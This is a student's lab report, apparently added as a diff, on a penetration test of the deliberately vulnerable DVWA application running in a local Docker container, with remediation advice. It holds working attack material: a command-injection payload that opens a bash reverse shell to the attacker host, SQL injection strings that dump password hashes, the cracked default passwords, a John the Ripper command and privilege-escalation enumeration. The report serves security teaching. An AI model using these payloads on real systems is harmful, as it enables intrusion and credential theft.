@@ -1,1 +1,205 @@
+# Lab 4 — Active Activity (Web Penetration Test)
+
+**Name:** NUR ALEA BATRISYIA BINTI MOHD FADZLY
+**Class / Section:** L01-B04
+**Course:** BCSS
+**Date:** 19/11/2026
+**Submission due:** 20/11/2026
+
+> **Scope & authorization:** All testing was performed against a deliberately
+> vulnerable training application (DVWA) running locally in a Docker container on
+> my own machine. No third-party, production, or unauthorized system was touched.
+
+---
+
+## 1. Target Setup (Victim)
+
+| Item | Value |
+|------|-------|
+| Application | Damn Vulnerable Web Application (DVWA) |
+| Image | `vulnerables/web-dvwa` |
+| Container ID | `b86eca4ba906` |
+| Deployment | Docker container |
+| Host OS (guest) | Debian (\*nix) |
+| Web server | Apache2 |
+| PHP version | 7.0.30 |
+| Database | MariaDB / MySQL (runs as `mysql` user) |
+| Web process user | `www-data` (uid 33) |
+| URL / Port | http://127.0.0.1 (80/tcp) |
+| Security level | Low |
+
+**Setup command:**
+```bash
+sudo docker run -d -p 80:80 vulnerables/web-dvwa
+```
+
+![Victim setup — docker ps](images/victim-setup.png)
+![DVWA setup check](images/dvwa-setup-check.png)
+
+---
+
+## 2. Attacker Host (Own Host)
+
+| Item | Value |
+|------|-------|
+| Machine / OS | Kali Linux on WSL2 (host: DESKTOP-B3HQ7HK) |
+| Shell | ZSH |
+| Docker bridge gateway | 172.17.0.1 |
+| Container IP | 172.17.0.2 |
+| Tools used | Browser, netcat, nmap, John the Ripper, Docker |
+
+![Attacker host](images/attacker-host.png)
+
+---
+
+## 3. Methodology
+
+1. **Setup** — deployed DVWA in Docker, initialised database, set security to Low.
+2. **Testing** — probed each module for injection and access-control flaws.
+3. **Exploitation** — escalated a web flaw into remote command execution and a shell.
+4. **Post-exploitation** — enumerated the host for privilege escalation.
+5. **Evidence** — captured requests, payloads, and results for each finding.
+
+---
+
+## 4. Findings
+
+### Finding 1 — OS Command Injection → Remote Code Execution (Critical)
+
+- **Location:** Command Injection module (`/vulnerabilities/exec/`), "Ping a device" field.
+- **Description:** User input is passed unsanitised into a shell `ping` command, allowing arbitrary OS commands to be chained.
+- **Proof of command execution:**
+  ```
+  127.0.0.1; whoami
+  ```
+  → returned `www-data`, confirming arbitrary command execution.
+- **Escalation to interactive shell (reverse shell):**
+  - Listener on attacker (WSL):
+    ```bash
+    nc -lvnp 4444
+    ```
+  - Payload in the web field (connects back to the Docker gateway):
+    ```
+    127.0.0.1; bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
+    ```
+  - Result: interactive shell as `www-data@b86eca4ba906`.
+- **Impact:** Full remote code execution on the web host — the most severe class of web vulnerability.
+
+**Evidence:**
+![Command execution — whoami](images/finding1-whoami.png)
+![Reverse shell connected](images/finding1-shell.png)
+
+---
+
+### Finding 2 — SQL Injection → Full Credential Disclosure (Critical)
+
+- **Location:** SQL Injection module (`/vulnerabilities/sqli/`), "User ID" field.
+- **Description:** User input is concatenated directly into a SQL query with no sanitisation or parameterisation.
+- **Confirmation (boolean):**
+  ```
+  1' OR '1'='1
+  ```
+  → returned all users, proving the WHERE clause is injectable.
+- **Data extraction (UNION):**
+  ```
+  1' UNION SELECT user, password FROM users-- -
+  ```
+  → dumped every username and password hash from the `users` table.
+- **Extracted hashes (MD5):**
+  | User | Hash |
+  |------|------|
+  | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+  | gordonb | e99a18c428cb38d5f260853678922e03 |
+  | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
+  | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+  | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
+- **Impact:** Unauthenticated disclosure of all application credentials.
+
+**Evidence:**
+![SQLi boolean confirmation](images/finding2-or1eq1.png)
+![SQLi hash dump](images/finding2-hashes.png)
+
+---
+
+### Finding 3 — Weak Password Storage (Unsalted MD5) (High)
+
+- **Description:** Passwords are stored as **unsalted MD5** hashes. Identical passwords produce identical hashes (admin and smithy share a hash), and the hashes are trivially crackable.
+- **Cracking (John the Ripper + rockyou):**
+  ```bash
+  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+  john --show --format=raw-md5 hashes.txt
+  ```
+- **Result — all 5 cracked in under 1 second:**
+  | User | Password |
+  |------|----------|
+  | admin | password |
+  | gordonb | abc123 |
+  | 1337 | charley |
+  | pablo | letmein |
+  | smithy | password |
+- **Impact:** Even if the database were only partially exposed, the password scheme provides no meaningful protection.
+
+**Evidence:**
+![John cracked passwords](images/finding3-john.png)
+
+---
+
+## 5. Privilege Escalation Attempt
+
+After obtaining a `www-data` shell, the host was enumerated for a path to root:
+
+```bash
+id                                      # uid=33(www-data), no privileged groups
+sudo -l                                 # sudo not installed
+find / -perm -4000 -type f 2>/dev/null  # only standard Debian SUID binaries
+ps aux | grep -E 'mysql|root'           # mysqld runs as 'mysql', not root
+mysql -u root -e 'select 1;'            # no passwordless root DB access
+```
+
+**Outcome:** No privilege-escalation path to root exists in this container. The SUID
+set contained only standard binaries (`ping`, `su`, `mount`, `passwd`, etc.), `sudo`
+was absent, and MySQL runs as the unprivileged `mysql` user. This is expected: the
+DVWA image is a *web-application* target, so the attack surface is intentionally
+limited to the web layer.
+
+![Enumeration — id / sudo / SUID](images/privesc-enum.png)
+![Process list — mysqld runs as mysql, not root](images/privesc-ps.png)
+
+---
+
+## 6. Limitations
+
+- Testing was conducted at **Low** security level; Medium/High/Impossible were not assessed.
+- Root privilege escalation was not achievable within the container (web-only target, by design).
+- Additional modules (CSRF, File Upload, File Inclusion, XSS variants) were not exhaustively tested.
+- No automated scanners were relied upon for the core findings — all exploitation was manual.
+
+---
+
+## 7. Interpretation & Analysis
+
+- **Command Injection (Finding 1)** → In a real system this is the worst case: an
+  attacker runs arbitrary commands as the web user, enabling data theft, lateral
+  movement, and (on a less-hardened host) full compromise.
+- **SQL Injection (Finding 2)** → Exposes the entire credentials table without
+  authentication, directly enabling account takeover.
+- **Weak hashing (Finding 3)** → Turns database exposure into immediate plaintext
+  passwords; unsalted MD5 offers effectively zero resistance.
+
+**Recommended remediations:**
+
+| Finding | Fix |
+|---------|-----|
+| Command Injection | Never pass user input to a shell; use safe APIs, strict allow-list validation, and avoid shell interpolation. |
+| SQL Injection | Use parameterised queries / prepared statements; apply least-privilege DB accounts. |
+| Weak hashing | Store passwords with a slow, salted algorithm (bcrypt / Argon2); enforce password complexity. |
+
+---
+
+## 8. References
+
+- OWASP Top 10 — https://owasp.org/www-project-top-ten/
+- OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection
+- OWASP SQL Injection — https://owasp.org/www-community/attacks/SQL_Injection
+- DVWA — https://github.com/
 
